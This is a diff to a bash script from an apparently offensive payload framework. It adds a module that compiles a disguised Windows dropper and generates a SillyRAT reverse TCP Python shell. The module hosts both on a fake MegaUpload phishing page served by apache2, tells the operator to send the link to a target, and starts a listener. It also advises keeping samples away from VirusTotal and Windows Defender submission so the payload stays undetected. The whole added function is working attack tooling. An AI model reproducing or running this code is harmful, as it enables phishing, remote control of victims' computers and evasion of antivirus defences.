@@ -11977,7 +11977,7 @@ cat << !
     LOLBin             : Powershell (DownloadFile)
     DROPPER EXTENSION  : BAT
     AGENT EXTENSION    : PS1
-    AGENT PERSISTENCE  : AVAILABLE (meterpeter)
+    AGENT PERSISTENCE  : AVAILABLE
 
     AGENT Nº5
     ─────────
@@ -11986,6 +11986,15 @@ cat << !
     LOLBin             : Powershell (DownloadFile)
     DROPPER EXTENSION  : EXE|PDF.EXE
     AGENT EXTENSION    : EXE
+    AGENT PERSISTENCE  : NOT AVAILABLE
+
+    AGENT Nº6
+    ─────────
+    DESCRIPTION        : Reverse TCP python Shell (SillyRAT)
+    TARGET SYSTEMS     : Multi-Platform (Linux|Mac|Windows)
+    LOLBin             : Powershell (DownloadFile)
+    DROPPER EXTENSION  : EXE
+    AGENT EXTENSION    : PY
     AGENT PERSISTENCE  : NOT AVAILABLE
 
 
@@ -12006,6 +12015,7 @@ case $choice in
 3) sh_evasion3 ;;
 4) sh_evasion4 ;;
 5) sh_evasion5 ;;
+6) sh_evasion6 ;;
 m|M) sh_menu ;;
 e|E) sh_exit ;;
 *) echo ${RedF}[x]${white} "$choice": is not a valid Option${Reset}; sleep 2; clear; sh_ninja ;;
@@ -13120,6 +13130,152 @@ fi
 
 sh_menu
 }
+
+
+
+
+
+# ------------------------------------------
+# SillyRAT (reverse TCP python shell)
+# https://....
+# ------------------------------------------
+sh_evasion6 () {
+Colors;
+
+## WARNING ABOUT SCANNING SAMPLES (VirusTotal)
+echo "---"
+echo "- ${YellowF}WARNING ABOUT SCANNING SAMPLES (VirusTotal)"${Reset};
+echo "- Please Dont test samples on Virus Total or on similar"${Reset};
+echo "- online scanners, because that will shorten the payload life."${Reset};
+echo "- And in testings also remmenber to stop the windows defender"${Reset};
+echo "- from sending samples to \$Microsoft.. (just in case)."${Reset};
+echo "---"
+sleep 2
+
+
+# ----------------- Dependencies Checks -----------------
+
+
+## Make Sure all dependencies are meet
+# Check if python3 its installed on attacker machine
+echo "${BlueF}[${YellowF}i${BlueF}]${white} Checking Module Dependencies.${white}";
+echo "${BlueF}[${YellowF}i${BlueF}]${white} Remark: python3 its required in Attacker/Target to exec Server/Client.${white}";sleep 2
+audit=$(python3 --version > /dev/null 2>&1) > /dev/null 2>&1
+if [ "$?" -ne "0" ]; then
+   echo "${RedF}[ERROR] python3 interpreter not found${white}"
+   echo "${BlueF}[${YellowF}i${BlueF}]${white} Please Wait, Installing python3 package."
+   echo "" && sudo apt-get update && apt-get install -y python3 && echo ""
+fi
+
+## Check if venomconf file exists
+if ! [ -e "$IPATH/bin/SillyRAT/venomconf" ]; then
+   cd $IPATH/bin/SillyRAT
+   echo "" && pip3 install -r requirements.txt && echo ""
+   ## Write 'venomconf' file to prevent the install function from running again
+   echo "venom 'SillyRAT' configuration file" > venomconf
+   cd $IPATH
+fi
+
+# -------------------------------------------------------
+
+
+## Store User Inputs (module bash variable declarations)..
+lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
+lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
+Drop=$(zenity --title="☠ Enter DROPPER FILENAME ☠" --text "example: Curriculum\nWarning: Allways Start FileNames With 'Capital Letters'" --entry --width 300) > /dev/null 2>&1
+rpath=$(zenity --title="☠ Enter Files Upload Path (target dir) ☠" --text "example: %tmp% (*)\nexample: %LocalAppData%\nexample: %userprofile%\\\\\\\Desktop\n\n(*) Recomended Path For Upload our files.\nRemark: Only CMD environment var's accepted" --entry --width 350) > /dev/null 2>&1
+
+## Setting default values in case user have skip this ..
+if [ -z "$lhost" ]; then lhost="$IP";fi
+if [ -z "$lport" ]; then lport="666";fi
+if [ -z "$rpath" ]; then rpath="%tmp%";fi
+if [ -z "$Drop" ]; then Drop="Python3Installer";fi
+
+
+## Display final settings to user.
+echo "${BlueF}[${YellowF}i${BlueF}]${white} AMSI MODULE SETTINGS"${Reset};sleep 2
+echo ${BlueF}"---"
+cat << !
+    LPORT    : $lport
+    LHOST    : $lhost
+    LOLBin   : Powershell (DownloadFile)
+    DROPPER  : $IPATH/output/$Drop.exe
+    AGENT    : $IPATH/output/Client.py
+    UPLOADTO : $rpath => (remote)
+!
+echo "---"
+
+
+cd $IPATH/output
+## BUILD DROPPER (to download/execute our legit pdf and agent.ps1).
+echo "${BlueF}[☠]${white} Creating dropper C Program."${Reset};sleep 2
+cp $IPATH/templates/sillyme.c $IPATH/output/dropper.c
+sed -i "s|LhOsT|$lhost|g" dropper.c
+sed -i "s|LpOrT|$lport|g" dropper.c
+sed -i "s|FiLNaMe|$Drop|g" dropper.c
+sed -i "s|TempDir|$rpath|g" dropper.c
+
+## COMPILING C Program USING mingw32 OR mingw-W64
+echo "${BlueF}[☠]${white} Compiling dropper using mingw32."${Reset};sleep 2
+# special thanks to astr0baby for mingw32 -mwindows -lws2_32 flag :D
+$ComP dropper.c -o $Drop.exe -lws2_32 -mwindows
+rm $IPATH/output/dropper.c > /dev/nul 2>&1
+
+## Writting Client reverse tcp python shell to output
+echo "${BlueF}[☠]${white} Writting Client rev tcp shell to output."${Reset};sleep 2
+cd $IPATH/bin/SillyRAT
+xterm -T " SillyRAT - $lhost:$lport" -geometry 120x23 -e "python3 server.py generate --address $lhost --port $lport --output $IPATH/output/Client.py --source && sleep 2"
+cd $IPATH
+
+
+## Building 'the Download Webpage' in HTML
+echo "${BlueF}[☠]${white} Building HTML Download WebPage (apache2)"${Reset};sleep 2
+cd $IPATH/templates/phishing
+sed "s|NaM3|http://$lhost/$Drop.zip|g" mega.html > MegaUpload.html
+mv MegaUpload.html $ApAcHe/MegaUpload.html > /dev/nul 2>&1
+
+cd $IPATH/output
+echo "${BlueF}[☠]${white} Porting required files to apache2 webroot."${Reset};sleep 2
+zip $Drop.zip $Drop.exe > /dev/nul 2>&1 # ZIP dropper.exe
+cp $IPATH/output/Client.py $ApAcHe/Client.py > /dev/nul 2>&1 # rev tcp Client shell
+mv $IPATH/output/$Drop.zip $ApAcHe/$Drop.zip > /dev/nul 2>&1 # Dropper ziped
+cd $IPATH
+
+
+## Print attack vector on terminal
+echo "${BlueF}[${GreenF}✔${BlueF}]${white} Starting apache2 webserver ..";sleep 2
+echo "${BlueF}---"
+echo "- ${YellowF}SEND THE URL GENERATED TO TARGET HOST${white}"
+echo "${BlueF}- ATTACK VECTOR: http://$lhost/MegaUpload.html"
+echo "${BlueF}- SYSINFO: systeminfo|findstr /C \"Host OS Manufacturer Type\""
+echo "${BlueF}---"${Reset};
+echo -n "${BlueF}[${YellowF}i${BlueF}]${white} Press any key to start a handler."
+read stupidpause
+
+cd $IPATH/output
+## START SERVER HANDLER ON SELLECTED IP/PORT NUMBER
+cp $IPATH/bin/SillyRAT/server.py $IPATH/output/server.py > /dev/nul 2>&1
+echo "" && python3 server.py bind --address 0.0.0.0 --port $lport
+cd $IPATH
+sleep 1
+
+
+## Clean old files.
+echo "${BlueF}[☠]${white} Please Wait, cleaning old files.${white}";sleep 2
+rm $ApAcHe/$Drop.zip > /dev/nul 2>&1
+rm $ApAcHe/Client.py > /dev/nul 2>&1
+rm $ApAcHe/Download.html > /dev/nul 2>&1
+rm $IPATH/output/dropper.c > /dev/nul 2>&1
+rm $IPATH/output/$Drop.zip > /dev/nul 2>&1
+rm $ApAcHe/MegaUpload.html > /dev/nul 2>&1
+rm $IPATH/output/server.py > /dev/nul 2>&1
+rm -r $ApAcHe/FakeUpdate_files > /dev/nul 2>&1
+
+
+sh_menu
+}
+
+
 
 
 
